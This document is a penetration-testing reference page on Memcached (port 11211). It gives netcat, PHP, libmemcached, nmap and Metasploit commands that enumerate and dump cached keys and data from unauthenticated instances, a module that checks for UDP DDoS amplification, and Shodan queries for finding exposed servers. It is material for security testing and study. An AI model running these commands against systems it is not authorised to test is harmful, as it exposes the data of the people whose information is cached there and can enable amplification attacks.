# 11211 - Pentesting Memcache

## Protocol Information

**Memcached** \(pronunciation: mem-cashed, mem-cash-dee\) is a general-purpose distributed [memory caching](https://en.wikipedia.org/wiki/Memory_caching) system. It is often used to speed up dynamic database-driven websites by caching data and objects in RAM to reduce the number of times an external data source \(such as a database or API\) must be read. \(From [wikipedia](https://en.wikipedia.org/wiki/Memcached)\)  
Although Memcached supports SASL, most instances are **exposed without authentication**.

**Default port:** 11211

```text
PORT      STATE SERVICE
11211/tcp open  unknown
```

## Enumeration

### Manual

To ex-filtrate all the information saved inside a memcache instance you need to:

1. Find **slabs** with **active items**
2. Get the **key names** of the slabs detected before
3. Ex-filtrate the **saved data** by **getting the key names**

Remember that this service is just a **cache**, so **data may be appearing and  disappearing**.

```bash
echo "version" | nc -vn -w 1 <IP> 11211      #Get version
echo "stats" | nc -vn -w 1 <IP> 11211        #Get status
echo "stats slabs" | nc -vn -w 1 <IP> 11211  #Get slabs
echo "stats items" | nc -vn -w 1 <IP> 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn -w 1 <IP> 11211  #Get key names (the 0 is for unlimited output size)
echo "get <item_name>" | nc -vn -w 1 <IP> 11211  #Get saved info

#This php will just dump the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'
```

### Manual2

```bash
sudo apt install libmemcached-tools
memcstat --servers=127.0.0.1 #Get stats
memcdump --servers=127.0.0.1 #Get all items
memccat  --servers=127.0.0.1 <item1> <item2> <item3> #Get info inside the item(s)
```

### Automatic

```bash
nmap -n -sV --script memcached-info -p 11211 <IP>   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible 
```

### **Shodan**

* `port:11211 "STAT pid"`
* `"STAT pid"`

